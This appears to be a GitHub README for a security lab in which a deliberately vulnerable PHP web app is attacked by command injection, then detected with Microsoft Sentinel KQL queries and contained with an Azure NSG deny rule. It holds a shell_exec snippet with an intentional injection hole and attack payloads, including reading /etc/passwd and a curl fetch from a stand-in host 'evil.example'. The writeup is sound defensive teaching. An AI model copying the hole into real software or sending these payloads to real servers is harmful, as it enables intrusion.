<div align="center">

# 🔴 Vulnerable Web Server Lab – RCE Exploitation, Detection & Incident Response

### Command Injection · Apache Log Ingestion · Microsoft Sentinel · KQL · NSG Containment

![Domain](https://img.shields.io/badge/Type-Offensive%20%2B%20Defensive%20Security%20Lab-red?style=for-the-badge)
![SIEM](https://img.shields.io/badge/SIEM-Microsoft%20Sentinel-blue?style=for-the-badge)
![Attack](https://img.shields.io/badge/Vulnerability-RCE%20%2F%20CWE--78-critical?style=for-the-badge)

<img src="https://img.shields.io/badge/Attack%20Stages-7%20Stage%20Kill%20Chain-red?style=flat-square" />
<img src="https://img.shields.io/badge/Real%20Attacker-103.168.66.101%20%E2%80%94%2082%20Events-critical?style=flat-square" />
<img src="https://img.shields.io/badge/Detection-KQL%20Analytics%20Rule-blue?style=flat-square" />
<img src="https://img.shields.io/badge/MITRE-8%20Techniques%20Mapped-orange?style=flat-square" />
<img src="https://img.shields.io/badge/Containment-NSG%20Deny%20Rule-brightgreen?style=flat-square" />

---

**Prepared by:** Bikash Raya

</div>

---

## 📁 Full Lab Walkthrough — Proof of Work

| File | Description |
| --- | --- |
| [Vulnerable_WebServer_RCE_Detection_IR_Lab_Report.pdf](./Vulnerable_WebServer_RCE_Detection_IR_Lab_Report.pdf) | Hands-on lab walkthrough with screenshots |


---
<br>

## 📋 Overview

This lab covers the full offensive-to-defensive security lifecycle — building a deliberately vulnerable web application, executing a 7-stage attack chain, ingesting Apache logs into Microsoft Sentinel, detecting the attack with KQL, investigating the incident, and containing it at the network layer.

A PHP web application was deployed with an intentional command injection flaw (CWE-78). After running the 7-stage attack, the VM was left exposed. Within days, real-world threat actor 103.168.66.101 found and exploited the same vulnerability — generating 82 correlated High-severity events in Sentinel.

**What this lab covers:**

* 🏗️ Deployed a vulnerable PHP web app (`shell_exec()` — CWE-78) on Ubuntu + Apache2 in Azure
* ⚔️ Executed a **7-stage attack chain** — recon → RCE → host discovery → user enumeration → process discovery → network discovery → payload retrieval
* 📡 Ingested Apache access logs into Microsoft Sentinel via **Custom Logs AMA** connector
* 🔍 Detected attack commands using **KQL** against the `ApacheHTTPServer_CL` table
* 🚨 Created a **scheduled High-severity analytics rule** mapped to MITRE ATT&CK
* 🌐 Left VM exposed — real attacker **103.168.66.101** independently found and exploited it → **82 correlated Sentinel events** detected and investigated
* 🔎 Investigated with **3 KQL queries** — attack classification, IP identification, timeline reconstruction
* 🛡️ Contained the attack with a **real NSG Deny rule** blocking the attacker IP on port 80

---

## 🛠️ Technologies Used

* Microsoft Azure (VM · NSG · Resource Group)
* Ubuntu Server 24.04 LTS
* Apache2 + PHP + libapache2-mod-php
* Microsoft Sentinel + Microsoft Defender XDR
* Log Analytics Workspace (VulnLab-LAW)
* Custom Logs via AMA (Data Connector)
* KQL (Kusto Query Language)
* Azure NSG (Network Security Groups)
* MITRE ATT&CK Framework

---

## 🧪 Lab Environment

| Component | Value |
| --- | --- |
| Resource Group | Vuln-Web-Lab (Australia East) |
| VM | VulnWeb-VM — Ubuntu Server 24.04 LTS x64 |
| Public IP | 20.5.176.148 |
| Web Server | Apache2 + PHP + libapache2-mod-php |
| Vulnerable Endpoint | `/internal/index.php` — `shell_exec()` — no input sanitization |
| NSG Rule | Port 80 open to internet (intentional) |
| Log Analytics Workspace | VulnLab-LAW |
| Data Connector | Custom Logs via AMA |
| Sentinel Table | `ApacheHTTPServer_CL` |
| Real Attacker IP | 103.168.66.101 |

---

## 🌐 Lab Architecture

```
[Internet — Attacker]
  Local (7-stage attack) + Real attacker 103.168.66.101
           │
           │  HTTP GET /internal/index.php?search=;whoami
           │  Port 80 — NSG Any/Any/Allow (intentional)
           ▼
[VulnWeb-VM — Ubuntu 24.04]
  Apache2 + PHP
  /internal/index.php — shell_exec($input) — NO SANITIZATION
  /var/log/apache2/access.log — all requests including attack commands logged
           │
           │  Custom Logs via AMA + Data Collection Rule
           ▼
[VulnLab-LAW — Log Analytics Workspace]
  Table: ApacheHTTPServer_CL
           │
           ▼
[Microsoft Sentinel]
  KQL Detection → High-Severity Analytics Rule
  → Incident Generated (82 correlated events)
  → 3 KQL Investigation Queries
  → Attack Classified, IP Identified, Timeline Reconstructed
           │
           ▼
[Azure NSG — Block-Malicious-IP-RCE]
  Deny 103.168.66.101 on Port 80 → Attack Contained ✅
```

---

## ⚠️ The Vulnerability — CWE-78 Command Injection

The "Internal File Search Tool" was deployed with an intentional command injection flaw. User input is concatenated directly into a shell command with zero sanitization — this is the vulnerability.

```php
<?php
$result = "";
$error  = "";

if(isset($_GET['search'])) {
    $input = $_GET['search'];

    // INTENTIONALLY VULNERABLE — CWE-78
    $command = "ls " . $input;        // user input concatenated directly into OS command
    $result  = shell_exec($command);   // arbitrary OS command executed on the server
}
?>
```

> **Why it works:** Appending `;` breaks out of the `ls` command. `?search=;whoami` becomes `ls ;whoami` — both commands execute and the output is returned directly in the browser.

---

## ⚔️ 7-Stage Attack Chain

| Stage | MITRE | Command | What it reveals |
|-------|-------|---------|-----------------|
| 1 — Reconnaissance | T1590 | URL enumeration `/admin` `/dev` `/internal` | Hidden internal application discovered |
| 2 — Initial Access (RCE) | T1190 | `?search=;whoami` | RCE confirmed — server runs as `www-data` |
| 3 — Host Discovery | T1082 | `?search=;uname -a` | OS version and kernel identified |
| 4 — User Enumeration | T1087 | `?search=;cat /etc/passwd` | All system user accounts listed |
| 5 — Process Discovery | T1057 | `?search=;ps aux` | Running processes and services identified |
| 6 — Network Discovery | T1046 | `?search=;ss -tulnp` | Listening ports and services identified |
| 7 — Payload Retrieval | T1105 | `?search=;curl http://evil.example/payload.sh` | Simulated C2 payload download |

---

## 📡 Apache Log Ingestion into Sentinel

| Setting | Value |
| --- | --- |
| Connector | Custom Logs via AMA |
| Log File | `/var/log/apache2/access.log` |
| DCR Name | ApacheHTTPServer |
| Sentinel Table | `ApacheHTTPServer_CL` |

---

## 🔍 KQL Detection

```kql
ApacheHTTPServer_CL
| where RawData has_any (
    "whoami", "hostname", "uname",
    "/etc/passwd", "ps", "ss",
    "curl", "payload.sh"
)
| project TimeGenerated, RawData
| order by TimeGenerated desc
```

---

## 🚨 Scheduled Analytics Rule

| Setting | Value |
| --- | --- |
| Rule Name | Linux Web Application Command Injection Detection |
| Severity | 🔴 **High** |
| Run Every | 5 minutes |
| Lookback | 10 minutes |
| Threshold | Results > 0 |
| Alert Grouping | 24-hour window |
| MITRE Techniques | T1190 · T1059 · T1082 · T1087 · T1105 |

---

## 🔎 Incident Investigation — 3 KQL Queries

**Incident:** 🔴 High severity | 82 correlated events | Source IP: 103.168.66.101

### Query 1 — Classify the Attack Activity
```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| extend Action = case(
    RawData has "whoami",          "RCE Attempt",
    RawData has "uname",           "System Recon",
    RawData has "cat /etc/passwd", "Credential Access Attempt",
    RawData has "curl",            "External Connection Attempt",
    "Other")
| project TimeGenerated, IP, Action, RawData
| order by TimeGenerated asc
```

### Query 2 — Identify the Attacker IP
```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| summarize AttackCount = count() by IP
| order by AttackCount desc
```
✅ **103.168.66.101** confirmed as top attacker.

### Query 3 — Reconstruct the Attack Timeline
```kql
ApacheHTTPServer_CL
| extend IP = tostring(split(RawData, " ")[0])
| summarize count() by bin(TimeGenerated, 5m), IP
| order by TimeGenerated asc
```
✅ Sequential phases visible — initial probing followed by escalating command execution.

---

## 🛡️ Containment — NSG Deny Rule

| Field | Value |
| --- | --- |
| Rule Name | Block-Malicious-IP-RCE |
| Source IP | 103.168.66.101 |
| Destination Port | 80 |
| Action | **Deny** |
| Priority | 101 |

✅ After the NSG rule was applied, the verification query returned no further requests from that IP — containment confirmed.

---

## 🔧 Eradication, Recovery & Post-Incident

> **Lab Scope:** The lab was completed through containment — NSG Deny rule blocking 103.168.66.101 on port 80. The phases below were not executed in this lab. They represent the real-world steps that would follow in a production SOC incident, and are included to demonstrate understanding of the full incident response lifecycle.

### Eradication
- **Code fix:** Replace `shell_exec()` with `escapeshellarg()` or use PHP native functions like `scandir()` — same result, no OS command risk
- **Authentication:** The `/internal/` endpoint must be placed behind a login — never expose internal tools publicly
- **WAF:** Deploy a Web Application Firewall to block injection patterns before they reach the application
- **Apache access controls:** Restrict `/internal/` to trusted IP ranges

### Recovery
- Confirm patched code is live and verify `;whoami` now returns an error
- Run post-fix KQL query to confirm no further attack traffic
- Decide whether NSG block on 103.168.66.101 should be retained permanently
- Monitor `ApacheHTTPServer_CL` for 24-48 hours post-recovery

### Post-Incident Review
- Detection worked — analytics rule triggered within 5 minutes, alert grouping consolidated 82 events into one incident
- No authentication on `/internal/` — a preventable risk
- Apache logs alone were sufficient to reconstruct the full 7-stage attack chain
- The real-world attacker appeared within days — any vulnerable public-facing service will be found and exploited quickly
- Network containment is not a substitute for a code fix — both layers are needed

---

## 🎯 MITRE ATT&CK Techniques

| Technique | Name | Tactic |
|-----------|------|--------|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059 | Command & Scripting Interpreter | Execution |
| T1082 | System Information Discovery | Discovery |
| T1033 | System Owner/User Discovery | Discovery |
| T1087 | Account Discovery | Discovery |
| T1057 | Process Discovery | Discovery |
| T1046 | Network Service Discovery | Discovery |
| T1105 | Ingress Tool Transfer | Command & Control |

---

## 🎯 Skills Demonstrated

* Vulnerable Web Application Deployment (PHP Command Injection — CWE-78)
* 7-Stage Offensive Attack Chain Execution
* Apache Log Ingestion into Sentinel (Custom Logs via AMA + DCR)
* KQL Threat Detection (has_any, extend, case, summarize, bin)
* Scheduled Analytics Rule Creation (High severity, MITRE mapped)
* Real Incident Investigation (3 KQL queries)
* Attack Timeline Reconstruction
* MITRE ATT&CK Mapping (8 techniques)
* NSG-Based Network Containment (real Deny rule)
* Microsoft Sentinel + Defender XDR Unified Portal
* Linux CLI & Azure VM Administration

---

## 🎯 Key Takeaway

> A vulnerable PHP app was built and attacked with a 7-stage kill chain. Sentinel was configured to detect the attack — and a real attacker (103.168.66.101) independently showed up and exploited the same vulnerability, generating 82 real events that were investigated and contained. This lab covered the complete SOC workflow end-to-end: detection, investigation, containment, eradication recommendation, recovery planning, and post-incident review.

---

## 🔗 Related Projects

> Part of the **Bikash Security Lab** series:
> * [Microsoft Sentinel & Defender XDR — SOC IR Lab](https://github.com/Bikash-Raya/Sentinel-Defender-XDR-SOC-Incident-Response-lab)
> * [Microsoft Sentinel — GeoIP Watchlist & Attack Map](https://github.com/Bikash-Raya/microsoft-sentinel-geoip-watchlist-attack-map)
> * [LummaC2 Threat Hunting — Sentinel & Sysmon](https://github.com/Bikash-Raya/Threat-Hunting-Lab-Sentinel-Sysmon--lummac2-)
> * [OWASP ZAP — Web Application Security](https://github.com/Bikash-Raya/Web-Application-Security-OWASP-ZAP)
> * [Nessus Vulnerability Management Lab](https://github.com/Bikash-Raya/Nessus-Vulnerability-Management-Lab)

---

> 📄 Thanks for reading! For a full hands-on walkthrough of this lab with screenshots — [download the lab report here](./Vulnerable_WebServer_RCE_Detection_IR_Lab_Report.pdf)

---

## 🔗 Connect With Me

<div align="center">

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/bikash-raya/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-black?style=for-the-badge&logo=github)](https://github.com/Bikash-Raya)

</div>

---

<div align="center">

⭐ If you find this project useful, feel free to star the repository ⭐

</div>
